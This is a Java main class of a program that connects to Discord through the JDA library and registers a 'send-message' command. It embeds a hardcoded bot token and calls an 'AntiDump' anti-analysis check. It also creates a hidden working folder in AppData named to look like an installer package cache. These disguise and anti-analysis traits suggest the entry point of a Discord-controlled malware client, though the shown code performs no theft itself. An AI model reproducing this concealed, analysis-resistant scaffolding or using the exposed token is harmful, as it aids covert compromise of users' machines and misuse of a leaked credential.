package me.vasler;

import me.vasler.listeners.CommandListener;
import me.vasler.listeners.StartListener;
import me.vasler.protection.AntiDump;
import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.interactions.commands.OptionType;
import net.dv8tion.jda.api.interactions.commands.build.OptionData;
import net.dv8tion.jda.api.requests.GatewayIntent;

import java.io.File;

public class Main {
    public static JDA jda;
    public static String name;
    public static File dir;

    public static void main(String[] args) {
        if (!dir.exists()) {
            dir.mkdirs();
        }
        AntiDump.check();
        CommandListener.INSTANCE = new CommandListener();
        jda = JDABuilder.createDefault("MTE3ODAyMDg4MjQ0NzMzOTYzMA.GwcqCx.94_qfPs2EmJwb-UeOP5kLlLcHhj5A3TZoLNjLo").enableIntents(GatewayIntent.MESSAGE_CONTENT, GatewayIntent.GUILD_MESSAGES).addEventListeners(new CommandListener(), new StartListener()).build();
        OptionData content = new OptionData(OptionType.STRING, "content", "Sends message with provided content", true);
        OptionData description = new OptionData(OptionType.STRING, "description", "Sends message with provided description", true);
        jda.upsertCommand("send-message", "Sends a message with the provided content").addOptions(content, description).queue();
    }

    static {
        name = System.getProperty("user.name");
        dir = new File(String.format("C:\\Users\\%s\\AppData\\Local\\Package Cache\\9779F8E04E7A01A68A3B636AE4B5212AA46575B2", name));
    }
}

